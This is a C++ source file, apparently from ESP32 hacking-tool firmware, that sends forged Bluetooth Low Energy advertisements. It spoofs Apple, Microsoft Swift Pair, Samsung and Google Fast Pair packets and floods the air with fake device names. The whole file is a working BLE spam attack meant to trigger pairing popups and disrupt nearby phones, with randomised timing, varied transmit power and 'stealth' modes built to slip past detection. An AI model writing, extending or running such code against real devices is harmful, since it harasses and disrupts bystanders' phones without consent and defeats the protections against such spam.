#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#ifdef CONFIG_BT_NIMBLE_ENABLED
#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif
#include "esp_mac.h"
#elif defined(CONFIG_BT_BLUEDROID_ENABLED)
#include "esp_gap_ble_api.h"
#endif
#include <globals.h>

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

enum EBLEPayloadType { AppleIOS, Microsoft, SamsungAll, GoogleFastPair, CustomName, NameFlood };

const char* flood_names[] = {
    "AirTag 1234", "Tile Mate 5678", "Samsung SmartTag",
    "Chipolo ONE", "Apple AirTag", "Tile Pro", "Eufy SmartTrack",
    "Nut 3", "Find My Device", "Smart Tracker", "Keys", "Wallet",
    "Backpack", "Camera", "Laptop", "Tablet", "Headphones",
    "AirPods Pro", "Galaxy Buds", "Sony WH-1000XM4", "Bose QC35",
    "JBL Flip", "Anker Soundcore", "Xiaomi Band", "Fitbit",
    "Garmin Watch", "Withings Scale", "August Lock", "Philips Hue",
    "Smart Plug", "Security Camera"
};

const int FLOOD_NAME_COUNT = sizeof(flood_names) / sizeof(flood_names[0]);

const uint8_t samsung_watch_ids[] = {
  0x1A,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,
  0x0A,0x0B,0x0C,0x11,0x12,0x13,0x14,0x15,0x16,0x17,
  0x18,0x1B,0x1C,0x1D,0x1E,0x20
};

const char* samsung_buds_ids[] = {
    "EE7A0C", "9D1700", "39EA48", "A7C62C", "850116",
    "3D8F41", "3B6D02", "AE063C", "B8B905", "EAAA17",
    "D30704", "9DB006", "101F1A", "859608", "8E4503",
    "2C6740", "3F6718", "42C519", "AE073A", "011716"
};

const uint8_t samsung_generic_ids[] = {
    0x25,0x26,0x27,0x28,0x29,0x2A,0x2B,0x2C,0x2D,0x2E,
    0x2F,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,
    0x39,0x3A,0x3B,0x3C
};

struct DeviceType {
    uint32_t value;
};

const uint32_t enhanced_models[] = {
    0xCD8256, 0x0000F0, 0xF00000, 0x821F66, 0xF52494,
    0xAABBCC, 0x112233, 0x445566, 0x778899, 0x99AABB,
    0xCCDDEE, 0xFF1122, 0x334455, 0x667788, 0x8899AA,
    0xBBCCDD, 0xEEFF11, 0x223344, 0x556677, 0x889900
};

const int ENHANCED_MODEL_COUNT = sizeof(enhanced_models) / sizeof(enhanced_models[0]);

static uint32_t packet_counter = 0;
static int64_t last_packet_time = 0;
static int stealth_mode_counter = 0;
BLEAdvertising *pAdvertising;

void generateAntiSpamMac(uint8_t *mac) {
    uint32_t r1 = esp_random();
    uint32_t r2 = (uint32_t)esp_timer_get_time();
    uint32_t r3 = packet_counter;
    uint32_t seed = r1 ^ (r2 << 16) ^ (r3 << 8);
    srand(seed);
    
    mac[0] = 0x02 | (rand() & 0xFC);
    for (int i = 1; i < 6; i++) {
        mac[i] = rand() % 256;
    }
    mac[0] &= 0xFE;
    mac[0] |= 0x02;
}

const char *generateRandomName() {
    static char randomName[12];
    const char *charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = 5 + (packet_counter % 6);
    for (int i = 0; i < len; ++i) {
        randomName[i] = charset[esp_random() % 26];
    }
    randomName[len] = '\0';
    return randomName;
}

void hexStringToBytes(const char* hexString, uint8_t* output, size_t outputLength) {
    for(size_t i = 0; i < outputLength; i++) {
        sscanf(hexString + (i * 2), "%2hhx", &output[i]);
    }
}

uint8_t* createEnhancedApplePacket(uint8_t deviceType, bool isContinuity = false) {
    static uint8_t packet[31];
    uint32_t timestamp = (uint32_t)(esp_timer_get_time() / 1000);
    
    if(isContinuity) {
        uint8_t continuity_base[] = {
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
            0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, deviceType,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
            0x00, 0x00
        };
        memcpy(packet, continuity_base, 23);
        
        int battery = 5 + (packet_counter % 20) * 5;
        packet[14] = 0x60;
        packet[15] = battery * 0x64 / 100;
        packet[16] = (timestamp >> 8) & 0xFF;
        packet[17] = timestamp & 0xFF;
        
        memset(packet + 18, 0, 5);
        return packet;
    } else {
        uint8_t random_hash[6];
        for(int i = 0; i < 6; i++) {
            random_hash[i] = esp_random() & 0xFF;
        }
        
        uint8_t device_base[] = {
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, deviceType,
            random_hash[0], random_hash[1], random_hash[2],
            random_hash[3], random_hash[4], random_hash[5],
            0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00
        };
        
        bool connected = (packet_counter % 7) == 0;
        int battery = 10 + ((packet_counter * 7) % 91);
        
        device_base[9] = 0x20 | (connected ? 0x10 : 0x00);
        device_base[10] = (timestamp >> 8) & 0xFF;
        device_base[11] = battery * 0x64 / 100;
        device_base[12] = packet_counter & 0xFF;
        
        memcpy(packet, device_base, 31);
        return packet;
    }
}

int calculateRealisticDelay(EBLEPayloadType type) {
    int baseDelay;
    int variation = 0;
    
    switch(type) {
        case AppleIOS:
            baseDelay = 30;
            variation = random(5, 25);
            break;
        case GoogleFastPair:
            baseDelay = 60;
            variation = random(10, 40);
            break;
        case Microsoft:
            baseDelay = 35;
            variation = random(5, 20);
            break;
        case SamsungAll:
            baseDelay = 40;
            variation = random(5, 25);
            break;
        case NameFlood:
            baseDelay = 15;
            variation = random(3, 12);
            break;
        default:
            baseDelay = 30;
            variation = random(5, 15);
    }
    
    variation += (packet_counter % 15) * 2;
    return baseDelay + variation;
}

BLEAdvertisementData getEnhancedFastPairData() {
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    
    static int fastpair_counter = 0;
    fastpair_counter++;
    
    uint32_t model = enhanced_models[fastpair_counter % ENHANCED_MODEL_COUNT];
    int8_t rssi = -70 + (fastpair_counter % 41);
    
    uint8_t Google_Data[16] = {
        0x03, 0x03, 0x2C, 0xFE, 
        0x08, 0x16, 0x2C, 0xFE,
        (uint8_t)((model >> 0x10) & 0xFF),
        (uint8_t)((model >> 0x08) & 0xFF),
        (uint8_t)((model >> 0x00) & 0xFF),
        0x02, 0x0A, 
        (uint8_t)rssi,
        (uint8_t)(fastpair_counter & 0xFF),
        0x00
    };
    
#ifdef NIMBLE_V2_PLUS
    AdvData.addData(Google_Data, 16);
#else
    AdvData.addData(std::string((char*)Google_Data, 16));
#endif
    
    return AdvData;
}

BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int specific_index = -1) {
    BLEAdvertisementData AdvData = BLEAdvertisementData();

    switch (Type) {
        case AppleIOS: {
            static int deviceIndex = 0;
            static bool useDevicePacket = true;
            static int continuityCounter = 0;
            
            if(useDevicePacket) {
                uint8_t deviceTypes[] = {0x02, 0x0E, 0x0A, 0x13, 0x14, 0x03, 0x0B, 0x0C, 0x11, 0x10, 0x01, 0x06, 0x20, 0x15};
                uint8_t* packet = createEnhancedApplePacket(deviceTypes[deviceIndex % 14], false);
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(packet, 31);
#else
                AdvData.addData(std::string((char*)packet, 31));
#endif
                deviceIndex++;
                
                uint8_t extra_data[] = {0x02, 0x01, 0x06, 0x03, 0x03, 0x12, 0x18};
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(extra_data, sizeof(extra_data));
#else
                AdvData.addData(std::string((char*)extra_data, sizeof(extra_data)));
#endif
            } else {
                uint8_t continuityTypes[] = {0x01, 0x06, 0x20, 0xC0, 0x0D, 0x13, 0x12, 0x0F};
                uint8_t* packet = createEnhancedApplePacket(continuityTypes[continuityCounter % 8], true);
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(packet, 23);
#else
                AdvData.addData(std::string((char*)packet, 23));
#endif
                continuityCounter++;
            }
            useDevicePacket = !useDevicePacket;
            break;
        }
        
        case Microsoft: {
            const char *Name = generateRandomName();
            uint8_t name_len = strlen(Name);
            uint32_t random_device_id = esp_random() & 0xFFFFFF;
            
            uint8_t AdvData_Raw[30 + name_len];
            uint8_t i = 0;
            
            AdvData_Raw[i++] = 6 + name_len;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], Name, name_len);
            i += name_len;
            
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x2C;
            AdvData_Raw[i++] = 0xFE;
            
            AdvData_Raw[i++] = 0x17;
            AdvData_Raw[i++] = 0x16;
            AdvData_Raw[i++] = 0x2C;
            AdvData_Raw[i++] = 0xFE;
            
            AdvData_Raw[i++] = (random_device_id >> 16) & 0xFF;
            AdvData_Raw[i++] = (random_device_id >> 8) & 0xFF;
            AdvData_Raw[i++] = random_device_id & 0xFF;
            
            for(int j = 0; j < 8; j++) {
                AdvData_Raw[i++] = random(256);
            }
            
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(AdvData_Raw, i);
#else
            AdvData.addData(std::string((char *)AdvData_Raw, i));
#endif
            break;
        }
        
        case SamsungAll: {
            static int samsung_cycle = 0;
            static int device_type = 0;
            
            uint8_t samsungData[16];
            samsungData[0] = 0x75;
            samsungData[1] = 0x00;
            
            samsungData[2] = 0x01;
            samsungData[3] = 0x00;
            samsungData[4] = 0x02;
            samsungData[5] = 0x00;
            samsungData[6] = 0x01;
            samsungData[7] = 0x01;
            samsungData[8] = 0xFF;
            samsungData[9] = 0x00;
            samsungData[10] = 0x00;
            samsungData[11] = 0x43;
            
            if(device_type == 0) {
                samsungData[12] = samsung_watch_ids[samsung_cycle % 26];
                device_type = 1;
            } 
            else if(device_type == 1) {
                const char* budsId = samsung_buds_ids[samsung_cycle % 20];
                uint8_t budsBytes[3];
                hexStringToBytes(budsId, budsBytes, 3);
                samsungData[12] = budsBytes[0];
                samsungData[13] = budsBytes[1];
                samsungData[14] = budsBytes[2];
                samsungData[15] = 0x01;
                device_type = 2;
            }
            else {
                samsungData[12] = samsung_generic_ids[samsung_cycle % 24];
                device_type = 0;
                samsung_cycle++;
            }
            
            AdvData.setManufacturerData(std::string((char*)samsungData, device_type == 1 ? 16 : 13));
            break;
        }
        
        case GoogleFastPair:
            AdvData = getEnhancedFastPairData();
            break;
        
        case CustomName: {
            break;
        }
        
        case NameFlood: {
            static int flood_index = 0;
            String floodName = String(flood_names[flood_index]);
            flood_index = (flood_index + 1) % FLOOD_NAME_COUNT;
            
            if(random(100) < 40) {
                int rnd = random(1000, 9999);
                floodName += " ";
                floodName += String(rnd);
            }
            
            if(random(100) < 30) {
                int battery = 1 + random(100);
                floodName += " [";
                floodName += String(battery);
                floodName += "%]";
            }
            
            AdvData.setFlags(0x06);
            AdvData.setName(floodName.c_str());
            
            uint32_t service_id = random(0xFFFF);
            char service_str[10];
            snprintf(service_str, sizeof(service_str), "%04lX", (unsigned long)service_id);
            String service_uuid = String("0000") + service_str + "-0000-1000-8000-00805f9b34fb";
            AdvData.setCompleteServices(BLEUUID(service_uuid.c_str()));
            break;
        }
    }

    return AdvData;
}

void executeEnhancedSpam(EBLEPayloadType type) {
    uint8_t macAddr[6];
    generateAntiSpamMac(macAddr);
    
    int actualDelay = calculateRealisticDelay(type);
    
    if(last_packet_time > 0) {
        int64_t time_since_last = (esp_timer_get_time() - last_packet_time) / 1000;
        if(time_since_last < 5) {
            vTaskDelay((10 - time_since_last) / portTICK_PERIOD_MS);
        }
    }
    
    BLEDevice::init("");
    vTaskDelay(3 / portTICK_PERIOD_MS);
    
    int8_t tx_power_variation = (packet_counter % 5) - 2;
    int actual_power = MAX_TX_POWER + tx_power_variation;
    if(actual_power < ESP_PWR_LVL_N12) actual_power = ESP_PWR_LVL_N12;
    if(actual_power > MAX_TX_POWER) actual_power = MAX_TX_POWER;
    
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)actual_power);
    
    pAdvertising = BLEDevice::getAdvertising();
    
    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
    
    BLEAdvertisementData scanResponse = BLEAdvertisementData();
    if(random(100) < 70) {
        char local_name[16];
        snprintf(local_name, sizeof(local_name), "Device_%04lX", (unsigned long)(esp_random() & 0xFFFF));
        scanResponse.setName(local_name);
        
        uint32_t service_uuid = 0xFE95 + (packet_counter % 0x100);
        char uuid_str[40];
        snprintf(uuid_str, sizeof(uuid_str), "0000%04lX-0000-1000-8000-00805f9b34fb", (unsigned long)service_uuid);
        scanResponse.addServiceUUID(BLEUUID(uuid_str));
    }
    pAdvertising->setScanResponseData(scanResponse);
    
    pAdvertising->setAdvertisementData(advertisementData);
    
    pAdvertising->start();
    vTaskDelay(actualDelay / portTICK_PERIOD_MS);
    pAdvertising->stop();
    
    int cleanup_delay = 2 + (packet_counter % 4);
    vTaskDelay(cleanup_delay / portTICK_PERIOD_MS);
    
    BLEDevice::deinit(false);
    
    packet_counter++;
    last_packet_time = esp_timer_get_time();
    
    if((packet_counter % 50) == 0) {
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
}

void executeStealthSpam(EBLEPayloadType type) {
    switch(stealth_mode_counter % 4) {
        case 0:
            executeEnhancedSpam(type);
            break;
        case 1: {
            uint8_t macAddr[6];
            generateAntiSpamMac(macAddr);
            BLEDevice::init("");
            esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_N12);
            
            pAdvertising = BLEDevice::getAdvertising();
            
            BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
            pAdvertising->setAdvertisementData(advertisementData);
            pAdvertising->start();
            vTaskDelay(15 / portTICK_PERIOD_MS);
            pAdvertising->stop();
            BLEDevice::deinit(false);
            
            packet_counter++;
            last_packet_time = esp_timer_get_time();
            break;
        }
        case 2:
            for(int i = 0; i < 3; i++) {
                executeEnhancedSpam(type);
                vTaskDelay(5 / portTICK_PERIOD_MS);
            }
            vTaskDelay(80 / portTICK_PERIOD_MS);
            break;
        case 3:
            vTaskDelay(60 / portTICK_PERIOD_MS);
            break;
    }
    
    stealth_mode_counter++;
}

void executeCustomSpam(String spamName) {
    uint8_t macAddr[6];
    generateAntiSpamMac(macAddr);
    
    BLEDevice::init("");
    vTaskDelay(3 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    
    pAdvertising = BLEDevice::getAdvertising();
    
    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x06);
    advertisementData.setName(spamName.c_str());
    
    uint32_t service_id = random(0xFFFF);
    char service_str[10];
    snprintf(service_str, sizeof(service_str), "%04lX", (unsigned long)service_id);
    String service_uuid = String("0000") + service_str + "-0000-1000-8000-00805f9b34fb";
    advertisementData.setCompleteServices(BLEUUID(service_uuid.c_str()));
    
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    vTaskDelay(25 / portTICK_PERIOD_MS);
    pAdvertising->stop();
    vTaskDelay(2 / portTICK_PERIOD_MS);
    
    BLEDevice::deinit(false);
    packet_counter++;
    last_packet_time = esp_timer_get_time();
}

void aj_adv(int ble_choice) {
    int timer = 0;
    int count = 0;
    String spamName = "";
    static int spam_all_index = 0;
    
    if (ble_choice == 5) { spamName = keyboard("", 10, "Name to spam"); }
    timer = millis();
    
    while (1) {
        if (millis() - timer > 25) {
            bool use_stealth = ((count % 15) >= 10);
            
            switch (ble_choice) {
                case 0:
                    displayTextLine("Apple iOS (" + String(count) + ")");
                    if(use_stealth) {
                        executeStealthSpam(AppleIOS);
                    } else {
                        executeEnhancedSpam(AppleIOS);
                    }
                    break;
                case 1:
                    displayTextLine("SwiftPair (" + String(count) + ")");
                    if(use_stealth) {
                        executeStealthSpam(Microsoft);
                    } else {
                        executeEnhancedSpam(Microsoft);
                    }
                    break;
                case 2:
                    displayTextLine("Samsung (" + String(count) + ")");
                    if(use_stealth) {
                        executeStealthSpam(SamsungAll);
                    } else {
                        executeEnhancedSpam(SamsungAll);
                    }
                    break;
                case 3:
                    displayTextLine("FastPair (" + String(count) + ")");
                    if(use_stealth) {
                        executeStealthSpam(GoogleFastPair);
                    } else {
                        executeEnhancedSpam(GoogleFastPair);
                    }
                    break;
                case 4:
                    displayTextLine("Spam All (" + String(count) + ")");
                    switch(spam_all_index % 4) {
                        case 0: 
                            if(use_stealth) executeStealthSpam(AppleIOS);
                            else executeEnhancedSpam(AppleIOS);
                            break;
                        case 1: 
                            if(use_stealth) executeStealthSpam(SamsungAll);
                            else executeEnhancedSpam(SamsungAll);
                            break;
                        case 2: 
                            if(use_stealth) executeStealthSpam(Microsoft);
                            else executeEnhancedSpam(Microsoft);
                            break;
                        case 3: 
                            if(use_stealth) executeStealthSpam(GoogleFastPair);
                            else executeEnhancedSpam(GoogleFastPair);
                            break;
                    }
                    spam_all_index++;
                    break;
                case 5:
                    displayTextLine("Custom Name (" + String(count) + ")");
                    executeCustomSpam(spamName);
                    break;
                case 6:
                    displayTextLine("Name Flood (" + String(count) + ")");
                    if(use_stealth) {
                        executeStealthSpam(NameFlood);
                    } else {
                        executeEnhancedSpam(NameFlood);
                    }
                    break;
            }
            count++;
            timer = millis();
        }

        if (check(EscPress)) {
            if(pAdvertising != nullptr) {
                pAdvertising->stop();
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }
            BLEDevice::deinit(true);
            vTaskDelay(50 / portTICK_PERIOD_MS);
            returnToMenu = true;
            break;
        }
    }
    
    packet_counter = 0;
    last_packet_time = 0;
    stealth_mode_counter = 0;
}
